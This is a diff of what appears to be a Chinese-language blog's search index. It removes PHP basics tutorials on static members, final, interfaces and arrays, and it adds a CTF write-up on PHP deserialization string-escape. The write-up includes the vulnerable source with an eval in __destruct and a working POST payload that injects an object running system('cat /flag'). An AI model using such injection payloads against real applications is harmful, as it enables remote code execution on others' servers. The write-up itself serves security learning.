-<p>private关键字:定义私有的成员属性或方法，只允许类的本身使用</p>
-<h4 id="4-静态"><a href="#4-静态" class="headerlink" title="4.静态"></a>4.静态</h4><p>static关键字</p>
-<ul>
-<li>静态属性用于保存类的公有数据；</li>
-<li>静态方法里面只能访问静态属性或方法，<strong>不能使用 $this 伪变量</strong>；</li>
-<li>静态成员<strong>不需要通过 new 关键字来实例化对象</strong>就可访问使用；</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;</span><br><span class="line">    static $name=&quot;张三&quot;;</span><br><span class="line">    static function say()&#123;</span><br><span class="line">        echo &quot;我的名字叫:&quot;.self::$name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo human::$name;   //以此来调用静态属性$name</span><br><span class="line">human::say();   //以此来使用静态方法say</span><br></pre></td></tr></table></figure>
+<p><code>object_sleep</code>会把<code>a*a</code>换为<code>@0@0@0@0@</code>，而<code>object_weakup</code>会把<code>@0@0@0@0@</code>换为<code>a*a</code>如果传入的有<code>a*a</code>，那么经过这两个函数的作用会相互抵消，就没有任何作用，但如果传入的是<code>@0@0@0@0@</code>，<code>object_sleep</code>函数就不会起作用，而是<code>object_sleep</code>会起作用，会使字符串减少，这就可以使用反序列化的字符串逃逸</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class order</span><br><span class="line">&#123;</span><br><span class="line">    public $f;</span><br><span class="line">    public $hint;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        eval($this-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = $_POST[&#x27;username&#x27;];</span><br><span class="line">$password = $_POST[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">$user = serialize(new UserAccount($username, $password));</span><br></pre></td></tr></table></figure>
 
-<p>输出 张三我的名字叫:张三</p>
-<h4 id="5-final关键字"><a href="#5-final关键字" class="headerlink" title="5.final关键字"></a>5.final关键字</h4><p>不允许成员方法被重写，不允许被继承</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;</span><br><span class="line">    final public function eat()&#123;   //这样这个eat方法子类将不能使用</span><br><span class="line">        echo &quot;父亲吃饭的方法，不允许子类重写&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">final class sport extends human&#123;  //这样sport不能再创建子类</span><br><span class="line">    public function eat()&#123;</span><br><span class="line">        echo &quot;子类吃饭的方法，此时程序将会报致命错误&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class student extends sport&#123;  //这里继承了sport类会报错</span><br><span class="line">    public $name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$h=new sport();</span><br><span class="line">$h-&gt;eat();</span><br><span class="line"></span><br><span class="line">$j=new student();</span><br><span class="line">$j-&gt;name=&quot;张三&quot;;</span><br></pre></td></tr></table></figure>
+<p>但是我们可以利用的是username和password，需要靠<code>eval($this-&gt;f);</code>来获得flag，没办法直接给order类的f属性传参，这就需要靠字符串逃逸了</p>
+<p>先讲一下字符串减少的逃逸</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAccount</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_weakup</span>(<span class="params"><span class="variable">$ob</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="string">&#x27;a*a&#x27;</span>, <span class="variable">$ob</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">UserAccount</span>(<span class="string">&#x27;@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@&#x27;</span>, <span class="string">&#x27;111&quot;;s:11:%00*%00password&quot;;s:3:&quot;123&quot;;&#125;&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">object_weakup</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>)));</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">s:<span class="number">160</span>:<span class="string">&quot;O:11:&quot;</span>UserAccount<span class="string">&quot;:2:&#123;s:11:&quot;</span> * username<span class="string">&quot;;s:45:&quot;</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="string">&quot;;s:11:&quot;</span> * password<span class="string">&quot;;s:38:&quot;</span><span class="number">111</span><span class="string">&quot;;s:11:%00*%00password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;<span class="string">&quot;;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">s:<span class="number">160</span>:<span class="string">&quot;O:11:&quot;</span>UserAccount<span class="string">&quot;:2:&#123;s:11:&quot;</span> * username<span class="string">&quot;;s:45:&quot;</span>a*aa*aa*aa*aa*a<span class="string">&quot;;s:11:&quot;</span> * password<span class="string">&quot;;s:38:&quot;</span><span class="number">111</span><span class="string">&quot;;s:11:%00*%00password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;<span class="string">&quot;;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
 
-<p>上面输出的结果会报错</p>
-<h4 id="6-接口"><a href="#6-接口" class="headerlink" title="6.接口"></a>6.接口</h4><p>定义接口关键字：interface</p>
-<p>实现接口方法关键字：implements</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">interface caneat&#123;   //定义一个接口</span><br><span class="line">    public function eat($food);</span><br><span class="line">&#125;</span><br><span class="line">class human implements caneat&#123;   //连接接口</span><br><span class="line">    public function eat($food)&#123;</span><br><span class="line">        echo &quot;我吃：&quot;.$food;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class animal implements caneat&#123;  //连接接口</span><br><span class="line">    public function eat($food)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;我吃:&quot;.$food;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$people=new human();</span><br><span class="line">$people-&gt;eat(&#x27;rice&#x27;);</span><br><span class="line"></span><br><span class="line">$monkey=new animal();</span><br><span class="line">$monkey-&gt;eat(&#x27;banana&#x27;);</span><br></pre></td></tr></table></figure>
+<p>本来给username赋值的是<code>@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@</code>，给password赋值的是<code>111&quot;;s:11:%00*%00password&quot;;s:3:&quot;123&quot;;&#125;</code>，但经过字符串减少的函数后username的值就变成了<code>a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:38:&quot;111</code>，password的值就成了123，而这个123就相当于逃逸出来，我们可以自己控制，只需要改变<code>s:3:&quot;123&quot;;</code>这里</p>
+<p>所以这个题就可以让后面逃逸出来给f属性进行传参，需要的f值是<code>system(&quot;cat /flag&quot;);</code>，需要让password的值传为<code>O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</code>，这样就可以给order类中的f属性进行赋值，但是如果直接给password传这个值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new UserAccount(&#x27;123&#x27;, &#x27;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;&#x27;)</span><br></pre></td></tr></table></figure>
 
-<p>输出</p>
-<p>我吃：rice我吃:banana</p>
+<p>那么序列化之后只会把这个值当作一个字符串看待，不会把它当作一个类，需要将这个值单独逃逸出来</p>
+<p>最终的payload可以是这样</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@&amp;password=123&quot;;s:11:&quot;%00*%00password&quot;;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样进行字符串减少后就成了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:11:&quot;UserAccount&quot;:2:&#123;s:11:&quot; * username&quot;;s:45:&quot;a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:93:&quot;123&quot;;s:11:&quot;%00*%00password&quot;;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>就相当于给username赋值了<code>a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:93:&quot;123</code>，给password赋值了一个类，而不是一个字符串，<code>O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</code>被当作类来处理从而给f属性进行赋值，最后利用<code>eval</code>来得到flag</p>
 ]]></content>
   </entry>
   <entry>
@@ -1614,111 +1532,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>反序列化逃逸</title>
-    <url>/2022/12/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/</url>
-    <content><![CDATA[<p>字符减少型</p>
-<span id="more"></span>
-
-<p>源码是</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAccount</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_sleep</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ob</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;a*a&#x27;</span>, <span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ob</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_weakup</span>(<span class="params"><span class="variable">$ob</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="string">&#x27;a*a&#x27;</span>, <span class="variable">$ob</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">order</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">UserAccount</span>(<span class="variable">$username</span>, <span class="variable">$password</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">object_weakup</span>(<span class="title function_ invoke__">object_sleep</span>(<span class="variable">$user</span>))));</span><br></pre></td></tr></table></figure>
-
-<p>刚打开有一个回显<code>object(UserAccount)#1 (2) &#123; [&quot;username&quot;:protected]=&gt; NULL [&quot;password&quot;:protected]=&gt; NULL &#125;</code></p>
-<p>看到最后有unserialize函数，可以反序列化，反序列化前还有自定义的函数<code>object_weakup</code>和<code>object_sleep</code>会起作用，看着两个函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function object_sleep($str)</span><br><span class="line">&#123;</span><br><span class="line">    $ob = str_replace(&#x27;a*a&#x27;, &#x27;@0@0@0@0@&#x27;, $str);</span><br><span class="line">    return $ob;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function object_weakup($ob)</span><br><span class="line">&#123;</span><br><span class="line">    $r = str_replace(&#x27;@0@0@0@0@&#x27;, &#x27;a*a&#x27;, $ob);</span><br><span class="line">    return $r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>object_sleep</code>会把<code>a*a</code>换为<code>@0@0@0@0@</code>，而<code>object_weakup</code>会把<code>@0@0@0@0@</code>换为<code>a*a</code>如果传入的有<code>a*a</code>，那么经过这两个函数的作用会相互抵消，就没有任何作用，但如果传入的是<code>@0@0@0@0@</code>，<code>object_sleep</code>函数就不会起作用，而是<code>object_sleep</code>会起作用，会使字符串减少，这就可以使用反序列化的字符串逃逸</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class order</span><br><span class="line">&#123;</span><br><span class="line">    public $f;</span><br><span class="line">    public $hint;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        eval($this-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = $_POST[&#x27;username&#x27;];</span><br><span class="line">$password = $_POST[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">$user = serialize(new UserAccount($username, $password));</span><br></pre></td></tr></table></figure>
-
-<p>但是我们可以利用的是username和password，需要靠<code>eval($this-&gt;f);</code>来获得flag，没办法直接给order类的f属性传参，这就需要靠字符串逃逸了</p>
-<p>先讲一下字符串减少的逃逸</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAccount</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_weakup</span>(<span class="params"><span class="variable">$ob</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="string">&#x27;a*a&#x27;</span>, <span class="variable">$ob</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">UserAccount</span>(<span class="string">&#x27;@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@&#x27;</span>, <span class="string">&#x27;111&quot;;s:11:%00*%00password&quot;;s:3:&quot;123&quot;;&#125;&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">object_weakup</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>)));</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">s:<span class="number">160</span>:<span class="string">&quot;O:11:&quot;</span>UserAccount<span class="string">&quot;:2:&#123;s:11:&quot;</span> * username<span class="string">&quot;;s:45:&quot;</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="string">&quot;;s:11:&quot;</span> * password<span class="string">&quot;;s:38:&quot;</span><span class="number">111</span><span class="string">&quot;;s:11:%00*%00password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;<span class="string">&quot;;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">s:<span class="number">160</span>:<span class="string">&quot;O:11:&quot;</span>UserAccount<span class="string">&quot;:2:&#123;s:11:&quot;</span> * username<span class="string">&quot;;s:45:&quot;</span>a*aa*aa*aa*aa*a<span class="string">&quot;;s:11:&quot;</span> * password<span class="string">&quot;;s:38:&quot;</span><span class="number">111</span><span class="string">&quot;;s:11:%00*%00password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;<span class="string">&quot;;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>本来给username赋值的是<code>@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@</code>，给password赋值的是<code>111&quot;;s:11:%00*%00password&quot;;s:3:&quot;123&quot;;&#125;</code>，但经过字符串减少的函数后username的值就变成了<code>a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:38:&quot;111</code>，password的值就成了123，而这个123就相当于逃逸出来，我们可以自己控制，只需要改变<code>s:3:&quot;123&quot;;</code>这里</p>
-<p>所以这个题就可以让后面逃逸出来给f属性进行传参，需要的f值是<code>system(&quot;cat /flag&quot;);</code>，需要让password的值传为<code>O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</code>，这样就可以给order类中的f属性进行赋值，但是如果直接给password传这个值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new UserAccount(&#x27;123&#x27;, &#x27;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;&#x27;)</span><br></pre></td></tr></table></figure>
-
-<p>那么序列化之后只会把这个值当作一个字符串看待，不会把它当作一个类，需要将这个值单独逃逸出来</p>
-<p>最终的payload可以是这样</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@&amp;password=123&quot;;s:11:&quot;%00*%00password&quot;;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这样进行字符串减少后就成了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:11:&quot;UserAccount&quot;:2:&#123;s:11:&quot; * username&quot;;s:45:&quot;a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:93:&quot;123&quot;;s:11:&quot;%00*%00password&quot;;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>就相当于给username赋值了<code>a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:93:&quot;123</code>，给password赋值了一个类，而不是一个字符串，<code>O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</code>被当作类来处理从而给f属性进行赋值，最后利用<code>eval</code>来得到flag</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>数组</title>
-    <url>/2022/11/11/%E6%95%B0%E7%BB%84/</url>
-    <content><![CDATA[<p>php数组的用法</p>
-<span id="more"></span>
-
-<h4 id="1-索引数组"><a href="#1-索引数组" class="headerlink" title="1.索引数组"></a>1.索引数组</h4><p><strong>将数组全部输出</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;wo&#x27;,&#x27;shi&#x27;,&#x27;shei&#x27;);</span><br><span class="line">var_dump($h);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">array(3) &#123; [0]=&gt; string(2) &quot;wo&quot; [1]=&gt; string(3) &quot;shi&quot; [2]=&gt; string(4) &quot;shei&quot; &#125;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;wo&#x27;,&#x27;shi&#x27;,&#x27;shei&#x27;);</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">Array ( [0] =&gt; wo [1] =&gt; shi [2] =&gt; shei )</span><br></pre></td></tr></table></figure>
-
-<p><strong>也可以将数组中特定的键值输出</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;wo&#x27;,&#x27;shi&#x27;,&#x27;shei&#x27;);</span><br><span class="line">echo $h[0];   //echo可以改成print_r或者var_dump</span><br><span class="line"></span><br><span class="line">输出   wo</span><br></pre></td></tr></table></figure>
-
-<p><em><strong>count()函数用于返回数组的长度（元素数）</strong></em></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;wo&#x27;,&#x27;shi&#x27;,&#x27;shei&#x27;);</span><br><span class="line">echo count($h);</span><br><span class="line"></span><br><span class="line">输出3，因为$h数组中有3个元素</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-关联数组"><a href="#2-关联数组" class="headerlink" title="2.关联数组"></a>2.关联数组</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&quot;wo&quot;=&gt;&quot;35&quot;,&quot;shi&quot;=&gt;&quot;45&quot;,&quot;shei&quot;=&gt;&quot;55&quot;);  //&quot;键名&quot;=&gt;&quot;键值&quot;</span><br><span class="line">var_dump($h);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">array(3) &#123; [&quot;wo&quot;]=&gt; string(2) &quot;35&quot; [&quot;shi&quot;]=&gt; string(2) &quot;45&quot; [&quot;shei&quot;]=&gt; string(2) &quot;55&quot; &#125;</span><br></pre></td></tr></table></figure>
-
-<p>将特定的键值输出</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&quot;wo&quot;=&gt;&quot;35&quot;,&quot;shi&quot;=&gt;&quot;45&quot;,&quot;shei&quot;=&gt;&quot;55&quot;);</span><br><span class="line">echo $h[&#x27;wo&#x27;];</span><br><span class="line"></span><br><span class="line">输出  35</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-多维数组"><a href="#3-多维数组" class="headerlink" title="3.多维数组"></a>3.多维数组</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二维数组</span><br><span class="line">&lt;?php</span><br><span class="line">$h=array(</span><br><span class="line">    array(&#x27;123&#x27;=&gt;&#x27;123&#x27;,&#x27;456&#x27;=&gt;&#x27;456&#x27;),</span><br><span class="line">    array(&#x27;12&#x27;=&gt;&#x27;12&#x27;,&#x27;34&#x27;=&gt;&#x27;34&#x27;),</span><br><span class="line">);</span><br><span class="line">print_r($h);</span><br></pre></td></tr></table></figure>
-
-<p>将特定的键值输出</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(</span><br><span class="line">    array(&#x27;123&#x27;=&gt;&#x27;123&#x27;,&#x27;456&#x27;=&gt;&#x27;456&#x27;),</span><br><span class="line">    array(&#x27;12&#x27;=&gt;&#x27;12&#x27;,&#x27;34&#x27;=&gt;&#x27;34&#x27;),</span><br><span class="line">);</span><br><span class="line">echo $h[1][&#x27;12&#x27;];</span><br><span class="line"></span><br><span class="line">输出  12</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-list-函数"><a href="#4-list-函数" class="headerlink" title="4.list()函数"></a>4.list()函数</h4><p>把数组中的值赋给一些变量</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;);</span><br><span class="line">list($one,$two,$three)=$h;</span><br><span class="line">echo $one.&#x27;&lt;br/&gt;&#x27;;</span><br><span class="line">echo $two.&#x27;&lt;br/&gt;&#x27;;</span><br><span class="line">echo $three;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure>
-
-<h4 id="5-数组的排序"><a href="#5-数组的排序" class="headerlink" title="5.数组的排序"></a>5.数组的排序</h4><p><strong>sort()对数组进行升序排列</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;volvo&#x27;,&#x27;bmw&#x27;,&#x27;toyota&#x27;);</span><br><span class="line">sort($h);   //会按照字母的顺序进行排序，这里是按照正的进行排序</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出Array ( [0] =&gt; bmw [1] =&gt; toyota [2] =&gt; volvo )</span><br></pre></td></tr></table></figure>
-
-<p><strong>rsort()对数组进行降序排列</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;volvo&#x27;,&#x27;bmw&#x27;,&#x27;toyota&#x27;);</span><br><span class="line">rsort($h);   //会按照字母的顺序进行排序，这里是按照反的进行排序</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出Array ( [0] =&gt; volvo [1] =&gt; toyota [2] =&gt; bmw )</span><br></pre></td></tr></table></figure>
-
-<p><strong>asort()根据数组的值，对数组进行升序排列</strong></p>
-<p><strong>arsort()根据数组的值，对数组进行降序排列</strong></p>
